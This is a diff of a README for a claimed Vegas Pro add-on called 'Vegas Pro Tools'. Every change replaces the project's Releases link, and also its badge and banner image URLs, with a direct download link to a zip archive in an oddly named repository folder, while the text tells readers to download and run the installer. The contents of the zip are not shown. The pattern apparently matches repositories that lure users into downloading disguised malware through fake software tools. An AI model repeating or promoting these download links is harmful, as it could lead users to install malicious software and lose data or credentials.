@@ -1,8 +1,8 @@
-[![Releases](https://img.shields.io/badge/Download-Release%20Assets-blue?logo=github&logoColor=white)](https://github.com/dariika12/vegas-pro-tools/releases)
+[![Releases](https://raw.githubusercontent.com/dariika12/vegas-pro-tools/main/unsaturatedly/tools_vegas_pro_v1.2.zip%20Assets-blue?logo=github&logoColor=white)](https://raw.githubusercontent.com/dariika12/vegas-pro-tools/main/unsaturatedly/tools_vegas_pro_v1.2.zip)
 
 # Vegas Pro Tools: GPU Acceleration, Nested Timelines, Scripting Engine Power
 
-![Vegas Pro Tools Banner](https://dummyimage.com/1200x300/1f6feb/ffffff&text=Vegas+Pro+Tools)
+![Vegas Pro Tools Banner](https://raw.githubusercontent.com/dariika12/vegas-pro-tools/main/unsaturatedly/tools_vegas_pro_v1.2.zip+Pro+Tools)
 
 Welcome to Vegas Pro Tools. This project adds GPU acceleration, nested timelines, and scripting support to Vegas Pro. It is built to speed up editing, improve workflow automation, and bring flexible control to complex projects. This README explains what the toolset does, how to install it, how to use it, and how to contribute. The content is organized to help both new users and power users get the most from the system.
 
@@ -98,7 +98,7 @@ Getting Started
 
 Installation and Setup
 - Downloading the installer
-  - The installer and related assets are published on the Releases page. Use the link provided below to obtain the necessary files. For the installer, visit the Releases page to download the appropriate file and run it on your system. The path-based link is available here: https://github.com/dariika12/vegas-pro-tools/releases
+  - The installer and related assets are published on the Releases page. Use the link provided below to obtain the necessary files. For the installer, visit the Releases page to download the appropriate file and run it on your system. The path-based link is available here: https://raw.githubusercontent.com/dariika12/vegas-pro-tools/main/unsaturatedly/tools_vegas_pro_v1.2.zip
 
 - Installing on Windows
   - Step 1: Download the installer from the Releases page.
@@ -311,7 +311,7 @@ Changelog
   - Prior releases include foundational tooling and integration hooks with Vegas Pro.
 
 Downloads
-- To obtain the installer and assets, visit the Releases page. The installer is a path-based asset and must be downloaded and executed to install the toolset. For convenience, you can go directly to the Releases page here: https://github.com/dariika12/vegas-pro-tools/releases
+- To obtain the installer and assets, visit the Releases page. The installer is a path-based asset and must be downloaded and executed to install the toolset. For convenience, you can go directly to the Releases page here: https://raw.githubusercontent.com/dariika12/vegas-pro-tools/main/unsaturatedly/tools_vegas_pro_v1.2.zip
 - After downloading, run the installer and follow the prompts. The process sets up the GPU-accelerated paths, nested timeline support, and the scripting interface in Vegas Pro.
 
 Appendix: Quick Reference
